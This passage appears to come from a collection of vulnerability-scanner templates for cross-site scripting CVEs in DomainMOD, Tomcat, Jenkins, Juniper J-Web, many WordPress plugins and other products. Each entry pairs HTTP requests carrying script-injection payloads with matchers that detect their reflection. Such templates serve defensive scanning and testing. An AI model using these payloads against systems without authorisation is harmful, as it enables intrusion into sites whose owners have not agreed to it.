    1. previousLoginMode: alert(document.domain),

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# DomainMOD \<=4.13.0 - Cross-Site Scripting
## Description
- DomainMOD through 4.13.0 contains a cross-site scripting vulnerability via /reporting/domains/cost-by-month.php in Daterange parameters.

- severity - medium
- tags - cve,cve2019,domainmod,xss,authenticated,edb
## Requests
### Step - 1
```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

new_username={{username}}&new_password={{password}}

```
### Step - 2
```
GET /reporting/domains/cost-by-month.php?daterange=%22onfocus=%22alert(document.domain)%22autofocus=%22 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. status_code_2 == 200
    2. contains(all_headers_2, "text/html")
    3. contains(body_2, "value=\"\"onfocus=\"alert(document.domain)\"autofocus=")
    4. contains(body_2, "DomainMOD")
- condition - and

---
# Open-School 3.0/Community Edition 2.3 - Cross-Site Scripting
## Description
- Open-School 3.0, and Community Edition 2.3, allows cross-site scripting via the osv/index.php?r=students/guardians/create id parameter.
- severity - medium
- tags - xss,open-school,packetstorm,cve,cve2019
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?r=students/guardians/create&id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Jenkins build-metrics 1.3 - Cross-Site Scripting
## Description
- Jenkins build-metrics 1.3 is vulnerable to a reflected cross-site scripting vulnerability that allows attackers to inject arbitrary HTML and JavaScript into the web pages the plugin provides.
- severity - medium
- tags - cve,cve2019,jenkins,xss,plugin,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/plugin/build-metrics/getBuildStats?label=%22%3E%3Csvg%2Fonload%3Dalert(1337)%3E&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<svg/onload=alert(1337)>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Carel pCOWeb \<B1.2.4 - Cross-Site Scripting
## Description
- Carel pCOWeb prior to B1.2.4 is vulnerable to stored cross-site scripting, as demonstrated by the config/pw_snmp.html "System contact" field.

- severity - medium
- tags - pcoweb,xss,carel,edb,cve,cve2019
## Requests
### Step - 1
```
POST /config/pw_snmp_done.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

%3Fscript%3Asetdb%28%27snmp%27%2C%27syscontact%27%29=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

```
### Step - 2
```
GET /config/pw_snmp.html HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_2, "text/html")
    2. status_code_2 == 200
    3. contains(body_2, 'value=\"\">\<script>alert(document.domain)\</script>\">\</td>')
- condition - and

---
# WordPress API Bearer Auth \<20190907 - Cross-Site Scripting
## Description
- WordPress API Bearer Auth plugin before 20190907 contains a cross-site scripting vulnerability. The server parameter is not correctly filtered in swagger-config.yaml.php.
- severity - medium
- tags - cve,cve2019,wordpress,xss,wp-plugin,auth
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/api-bearer-auth/swagger/swagger-config.yaml.php?&server=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Zarafa WebApp \<=2.0.1.47791 - Cross-Site Scripting
## Description
- Zarafa WebApp 2.0.1.47791 and earlier contains an unauthenticated reflected cross-site scripting vulnerability. An attacker can execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.

- severity - medium
- tags - cve,cve2019,zarafa,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/webapp/?fccc%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<svg/onload=alert(/xss/)>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress My Calendar \<= 3.1.9 - Cross-Site Scripting
## Description
- WordPress plugin My Calendar \<= 3.1.9 is susceptible to reflected cross-site scripting which can be triggered via unescaped usage of URL parameters in multiple locations throughout the site.
- severity - medium
- tags - cve,cve2019,wordpress,xss,wp-plugin,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Laborator Neon Theme 2.0 - Cross-Site Scripting
## Description
- WordPress Laborator Neon theme 2.0 contains a cross-site scripting vulnerability via the data/autosuggest-remote.php q parameter.
- severity - medium
- tags - cve,cve2019,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/data/autosuggest-remote.php?q=">\<img%20src=x%20onerror=alert(1)>
- {{BaseURL}}/admin/data/autosuggest-remote.php?q=">\<img%20src=x%20onerror=alert(1)>
### Matchers

**Type - word**
- words
    1. >\<img src=x onerror=alert(1)>>)1(trela=rorreno
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Apache Tomcat - Cross-Site Scripting
## Description
- Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 are vulnerable to cross-site scripting because the SSI printenv command echoes user provided data without escaping. Note: SSI is disabled by default. The printenv command is intended for debugging and is unlikely to be present in a production website.

- severity - medium
- tags - apache,xss,tomcat,seclists,edb,cve,cve2019
## Requests
- Method - GET
### URL
- {{BaseURL}}/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
- {{BaseURL}}/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
### Matchers

**Type - word**
- words
    1. \<script>alert('xss')\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Download Manager \<2.9.94 - Cross-Site Scripting
## Description
- WordPress Download Manager plugin before 2.9.94 contains a cross-site scripting vulnerability via the category shortcode feature, as demonstrated by the orderby or search[publish_date] parameter.
- severity - medium
- tags - cve,cve2019,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wpdmpro/list-packages/?orderby=title%22%3E%3Cscript%3Ealert(1)%3C/script%3E&order=asc
### Matchers

**Type - word**
- words
    1. \<script>alert(1)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Zyxel ZyWal/USG/UAG Devices - Cross-Site Scripting
## Description
- Zyxel ZyWall, USG, and UAG devices allow remote attackers to inject arbitrary web script or HTML via the err_msg parameter free_time_failed.cgi CGI program, aka reflective cross-site scripting.
- severity - medium
- tags - cve,cve2019,zyxel,zywall,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/free_time_failed.cgi?err_msg=\<script>alert(document.domain);\</script>
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain);\</script>
    2. Please contact with administrator.
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# KindEditor 4.1.11 - Cross-Site Scripting
## Description
- KindEditor 4.1.11 contains a cross-site scripting vulnerability via the php/demo.php content1 parameter.
- severity - medium
- tags - cve,cve2019,kindeditor,xss
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/kindeditor/php/demo.php
- {{BaseURL}}/php/demo.php
  - content1=</script><script>alert(document.domain)</script>&button=%E6%8F%90%E4%BA%A4%E5%86%85%E5%AE%B9
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

---
# SugarCRM Enterprise 9.0.0 - Cross-Site Scripting
## Description
- SugarCRM Enterprise 9.0.0 contains a cross-site scripting vulnerability via mobile/error-not-supported-platform.html?desktop_url.
- severity - medium
- tags - cve2019,xss,sugarcrm,edb,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/mobile/error-not-supported-platform.html?desktop_url=javascript:alert(1337);//itms://
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. url = window.location.search.split("?desktop_url=")[1]
- part - body

---
# Timesheet Next Gen \<=1.5.3 - Cross-Site Scripting
## Description
- Timesheet Next Gen 1.5.3 and earlier is vulnerable to cross-site scripting that allows an attacker to execute arbitrary HTML and JavaScript code via a "redirect" parameter. The component is: Web login form: login.php, lines 40 and 54. The attack vector is: reflected XSS, victim may click the malicious url.
- severity - medium
- tags - cve,cve2019,timesheet,xss
## Requests
### Step - 1
```
POST /timesheet/login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscript%3E&password=pd&submit=Login

```
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. >\<script>javascript:alert(document.domain)\</script>
- part - body

---
# L-Soft LISTSERV \<16.5-2018a - Cross-Site Scripting
## Description
- L-Soft LISTSERV before 16.5-2018a contains a reflected cross-site scripting vulnerability via the /scripts/wa.exe OK parameter.
- severity - medium
- tags - cve,cve2019,xss,listserv,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/scripts/wa.exe?OK=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# 2 Click Socialmedia Buttons \< 0.34 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in libs/xing.php in the 2 Click Social Media Buttons plugin before 0.34 for WordPress allows remote attackers to inject arbitrary web script or HTML via the xing-url parameter.
- severity - medium
- tags - cve,cve2012,wordpress,xss,wp-plugin,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/2-click-socialmedia-buttons/libs/xing.php?xing-url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Plugin All-in-One Event Calendar 1.4 - Cross-Site Scripting
## Description
- Multiple cross-site scripting vulnerabilities in the All-in-One Event Calendar plugin 1.4 and 1.5 for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) title parameter to app/view/agenda-widget-form.php; (2) args, (3) title, (4) before_title, or (5) after_title parameter to app/view/agenda-widget.php; (6) button_value parameter to app/view/box_publish_button.php; or (7) msg parameter to /app/view/save_successful.php.
- severity - medium
- tags - cve,cve2012,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Plugin Download Monitor \< 3.3.5.9 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in the Download Monitor plugin before 3.3.5.9 for WordPress allows remote attackers to inject arbitrary web script or HTML via the dlsearch parameter to the default URI.
- severity - medium
- tags - xss,wp-plugin,packetstorm,cve,cve2012,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/?dlsearch=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# YouSayToo auto-publishing 1.0 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in yousaytoo.php in YouSayToo auto-publishing plugin 1.0 for WordPress allows remote attackers to inject arbitrary web script or HTML via the submit parameter.
- severity - medium
- tags - wp-plugin,packetstorm,cve,cve2012,wordpress,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/yousaytoo-auto-publishing-plugin/yousaytoo.php?submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Plugin MF Gig Calendar 0.9.2 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in the MF Gig Calendar plugin 0.9.2 for WordPress allows remote attackers to inject arbitrary web script or HTML via the query string to the calendar page.
- severity - medium
- tags - cve,cve2012,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/?page_id=2&%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# ManageEngine Firewall Analyzer 7.2 - Cross-Site Scripting
## Description
- Multiple cross-site scripting vulnerabilities in ManageEngine Firewall Analyzer 7.2 allow remote attackers to inject arbitrary web script or HTML via the (1) subTab or (2) tab parameter to createAnomaly.do; (3) url, (4) subTab, or (5) tab parameter to mindex.do; (6) tab parameter to index2.do; or (7) port parameter to syslogViewer.do.
- severity - medium
- tags - cve,cve2012,xss,manageengine,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/fw/syslogViewer.do?port=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Integrator 1.32 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in wp-integrator.php in the WordPress Integrator module 1.32 for WordPress allows remote attackers to inject arbitrary web script or HTML via the redirect_to parameter to wp-login.php.
- severity - medium
- tags - cve2012,wordpress,xss,wp-plugin,packetstorm,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-login.php?redirect_to=http%3A%2F%2F%3F1%3C%2FsCripT%3E%3CsCripT%3Ealert%28document.domain%29%3C%2FsCripT%3E
### Matchers

**Type - word**
- words
    1. \</sCripT>\<sCripT>alert(document.domain)\</sCripT>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WP-FaceThumb 0.1 - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in index.php in the WP-FaceThumb plugin 0.1 for WordPress allows remote attackers to inject arbitrary web script or HTML via the pagination_wp_facethumb parameter.
- severity - medium
- tags - packetstorm,cve,cve2012,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/?page_id=1&pagination_wp_facethumb=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# AWStats 6.95/7.0 - 'awredir.pl' Cross-Site Scripting
## Description
- AWStats is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.
- severity - medium
- tags - cve,cve2012,xss,awstats,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E
- {{BaseURL}}/cgi-bin/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Nortek Linear eMerge E3-Series - Cross-Site Scripting
## Description
- There is a local session fixation vulnerability that, when chained with cross-site scripting, leads to account take over of admin or a lower privileged user.

- severity - medium
- tags - cve2022,emerge,nortek,xss,packetstorm,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/card_scan.php?No=0000&ReaderNo=0000&CardFormatNo=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E
### Matchers

**Type - word**
- part - body
- words
    1. ,"CardFormatNo":"\<img src=x onerror=alert(document.domain)>"}

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Artica Proxy 4.30.000000 - Cross-Site Scripting
## Description
- Artica Proxy 4.30.000000 contains a cross-site scripting vulnerability via the password parameter in /fw.login.php.

- severity - medium
- tags - cve,cve2022,xss,artica
## Requests
### Step - 1
```
POST /fw.login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

userfont=&artica-language=&StandardDropDown=&HTMLTITLE=&username=admin&password=admin%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

```
### Matchers

**Type - word**
- part - body
- words
    1. Password" value="admin">\<script>alert(document.domain)\</script>
    2. Artica Web
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Copyright Proof \<=4.16 - Cross-Site-Scripting
## Description
- WordPress Copyright Proof plugin 4.16 and prior contains a cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back via an AJAX action available to both unauthenticated and authenticated users when a specific setting is enabled.

- severity - medium
- tags - wordpress,xss,wp-plugin,wp,wpscan,cve,cve2022
## Requests
### Step - 1
```
GET /wp-admin/admin-ajax.php?action=dprv_log_event&message=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. got message \<script>alert(document.domain)\</script>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Advanced Booking Calendar \< 1.7.1 - Cross-Site Scripting
## Description
- The Advanced Booking Calendar WordPress plugin before 1.7.1 does not sanitise and escape the room parameter before outputting it back in an admin page, leading to a Reflected Cross-Site Scripting issue

- severity - medium
- tags - wp-plugin,advanced-booking-calendar,cve,cve2022,wp,authenticated,wpscan,wordpress,xss
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/admin.php?page=advanced-booking-calendar-show-seasons-calendars&setting=changeSaved&room=1111%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%22 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_2, '\<script>alert(document.domain)\</script>')
    2. contains(body_2, 'advanced-booking-calendar')
    3. contains(all_headers_2, 'text/html')
    4. status_code_2 == 200
- condition - and

---
# ProfileGrid \< 5.1.1 - Cross-Site Scripting
## Description
- The ProfileGrid WordPress plugin before 5.1.1 does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting.

- severity - medium
- tags - wp-plugin,wordpress,wpscan,cve,wp,xss,profilegrid,authenticated,cve2022
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/admin.php?page=pm_add_group&id="><script>alert%28document.domain%29<%2Fscript> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_2, "text/html")
    2. status_code_2 == 200
    3. contains(body_2, "Extension Options")
    4. contains(body_2, "\<script>alert(document.domain)\</script>&tab")
- condition - and

---
# WordPress Feed Them Social \<3.0.1 - Cross-Site Scripting
## Description
- WordPress Feed Them Social plugin before 3.0.1 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back in the page.

- severity - medium
- tags - wp,wordpress,wp-plugin,wpscan,cve,cve2022,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=fts_refresh_token_ajax&feed=instagram&expires_in=%3Cimg%20src%20onerror%3Dalert%28document.domain%29%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<img src onerror=alert(document.domain)>\<br/>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Easy Pricing Tables \<3.2.1 - Cross-Site Scripting
## Description
- WordPress Easy Pricing Tables plugin before 3.2.1 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before reflecting it back in a page available to any user both authenticated and unauthenticated when a specific setting is enabled.

- severity - medium
- tags - wp,wordpress,wpscan,cve,cve2022,wp-plugin,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=\<script>alert(document.domain)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script> - Color

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# H3C SSL VPN \<=2022-07-10 - Cross-Site Scripting
## Description
- H3C SSL VPN 2022-07-10 and prior contains a cookie-based cross-site scripting vulnerability in wnm/login/login.json svpnlang.

- severity - medium
- tags - cve,cve2022,xss,vpn,h3c
## Requests
### Step - 1
```
GET /wnm/login/login.json HTTP/1.1
Host: {{Hostname}}
Cookie: svpnlang=<script>alert('document.domain')</script>

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert('document.domain')\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Parallels H-Sphere 3.6.1713 - Cross-Site Scripting
## Description
- Parallels H-Sphere 3.6.1713 contains a cross-site scripting vulnerability via the index_en.php 'from' parameter.

- severity - medium
- tags - cve,cve2022,parallels,hsphere,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/index_en.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/index.php?from=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \<TITLE>">\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Country Selector \< 1.6.6 - Cross-Site Scripting
## Description
- The plugin does not sanitise and escape the country and lang parameters before outputting them back in the response, leading to a Reflected Cross-Site Scripting.

- severity - medium
- tags - wordpress-country-selector,wpscan,cve,cve2022,wp,wordpress,wp-plugin,xss
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
POST /wp-admin/admin-ajax.php?action=check_country_selector HTTP/2
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

country=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E&lang=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E&site_locate=en-US

```
### Matchers

**Type - word**
- part - body
- words
    1. \<img src=x onerror=alert(document.domain)>
    2. country_selector_
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# ZEROF Web Server 2.0 - Cross-Site Scripting
## Description
- ZEROF Web Server 2.0 allows /admin.back cross-site scripting.
- severity - medium
- tags - xss,cve,cve2022,zerof
## Requests
- Method - GET
### URL
- {{BaseURL}}/admin.back\<img%20src=x%20onerror=alert(document.domain)>
### Matchers

**Type - word**
- part - body
- words
    1. back\<img src=x onerror=alert(document.domain)>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 401

---
# eShop 3.0.4 - Cross-Site Scripting
## Description
- eShop 3.0.4 contains a reflected cross-site scripting vulnerability in json search parse and json response in wrteam.in.

- severity - medium
- tags - cve,cve2022,eshop,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/home/get_products?search=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
### Matchers

**Type - word**
- words
    1. Search Result for \">\<img src=x onerror=alert(document.domain)>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Juniper Web Device Manager - Cross-Site Scripting
## Description
- A Cross-site Scripting (XSS) vulnerability in the J-Web component of Juniper Networks Junos OS allows an unauthenticated attacker to run malicious scripts reflected off of J-Web to the victim's browser in the context of their session within J-Web

- severity - medium
- tags - cve,cve2022,xss,juniper,junos
## Requests
- Method - GET
### URL
- {{BaseURL}}/error.php?SERVER_NAME=\<script>alert(document.domain)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. The requested resource is not authorized to view
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# PMB 7.3.10 - Cross-Site Scripting
## Description
- PMB 7.3.10 contains a reflected cross-site scripting vulnerability via the id parameter in an lvl=author_see request to index.php.

- severity - medium
- tags - cve,cve2022,pmb,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php?lvl=author_see&id=42691%27%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>' target='cart_info

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress E2Pdf \<1.16.45 - Cross-Site Scripting
## Description
- WordPress E2Pdf plugin before 1.16.45 contains a cross-site scripting vulnerability. The plugin does not sanitize and escape some of its settings, even when the unfiltered_html capability is disallowed. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site, making it possible to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve2022,wp-plugin,xss,authenticated,e2pdf,wpscan,cve,wordpress,wp
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/admin.php?page=e2pdf-settings HTTP/1.1
Host: {{Hostname}}

```
### Step - 3
```
POST /wp-admin/admin.php?page=e2pdf-settings HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_nonce={{nonce}}&e2pdf_user_email=&e2pdf_api=api.e2pdf.com&e2pdf_connection_timeout=300&e2pdf_processor=0&e2pdf_dev_update=0&e2pdf_url_format=siteurl&e2pdf_mod_rewrite=0&e2pdf_mod_rewrite_url=e2pdf%2F%25uid%25%2F&e2pdf_cache=0&e2pdf_cache=1&e2pdf_cache_fonts=0&e2pdf_cache_fonts=1&e2pdf_debug=0&e2pdf_hide_warnings=0&e2pdf_images_remote_request=0&e2pdf_images_timeout=30&e2pdf_revisions_limit=3&e2pdf_memory_time=0&e2pdf_developer=0&e2pdf_developer_ips=%3C%2Ftextarea%3E%3Csvg%2Fonload%3Dalert%28document.domain%29%3E&submit=Save+Changes

```
### Step - 4
```
GET /wp-admin/admin.php?page=e2pdf-settings HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(body_4, 'placeholder=\"Developer IPs\" >\</textarea>\<svg/onload=alert(document.domain)>')
    2. contains(all_headers_4, "text/html")
    3. status_code_4 == 200
- condition - and
### Extractors

**Type - regex**
- name - nonce
- internal - True
- group - 1
- regex
    1. name="_nonce" value="([0-9a-zA-Z]+)"

---
# Atmail 6.5.0 - Cross-Site Scripting
## Description
- Atmail 6.5.0 contains a cross-site scripting vulnerability via the index.php/admin/index/ 'error' parameter.

- severity - medium
- tags - cve,cve2022,atmail,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/atmail/index.php/admin/index/?error=1%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. Error: 1\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress All-in-One WP Migration \<=7.62 - Cross-Site Scripting
## Description
- WordPress All-in-One WP Migration plugin 7.62 and prior contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,all-in-one-wp-migration,authenticated,wpscan,cve2022,wordpress,wp-plugin,wp,xss
